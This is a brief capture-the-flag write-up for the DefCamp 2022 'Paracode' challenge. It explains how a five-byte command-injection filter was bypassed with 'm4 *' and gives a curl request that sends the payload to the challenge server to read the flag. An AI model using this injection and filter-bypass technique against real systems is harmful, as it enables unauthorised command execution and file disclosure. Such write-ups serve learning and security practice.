<h1>DefCamp 2022 Paracode</h1>

<b>Note:</b> Our limit is 5 bytes without the string containing any of the combo in the array provided in the index.php. I went through and sorted out all 2 letter Linux commands that can
output all input. I came to the conclusion that m4 works well, with a wild card.
```
curl -X GET "http://34.159.7.96:32210/?start=m4+*" 2>&1 | grep '$flag' | sed 1q
```
